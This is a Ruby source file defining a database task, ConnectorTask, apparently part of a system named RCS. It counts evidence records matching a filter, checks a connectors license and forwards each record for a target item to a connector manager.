# encoding: UTF-8

require_relative '../tasks'

module RCS
  module DB
    class ConnectorTask
      include NoFileTaskType
      include RCS::Tracer

      def total
        num = ::Evidence.report_count(@params)
        trace(:info, "Sending #{num} to rcs-connector")
        num
      end

      def has_license?
        LicenseManager.instance.check(:connectors)
      end

      def target
        @__target ||= Item.find(@params['filter']['target'])
      end

      def next_entry
        @description = "Processing #{@total} evidence"

        ::Evidence.report_filter(@params).each { |evidence|
          ConnectorManager.process_evidence(target, evidence)
          yield
        }

        yield(@description = "Ended")
      end
    end
  end
end
